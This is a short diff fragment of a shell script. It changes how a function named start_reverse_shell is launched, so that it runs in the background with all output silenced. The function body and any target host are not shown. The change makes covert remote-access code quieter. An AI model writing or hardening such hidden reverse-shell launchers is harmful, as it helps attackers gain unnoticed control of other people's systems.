@@ -13,5 +13,5 @@ start_reverse_shell() {
     done
 }
 
-# Start the reverse shell function in the background, suppressing any error message
-start_reverse_shell & disown
+# Start the reverse shell function in the background and redirect all output to /dev/null
+start_reverse_shell &>/dev/null &
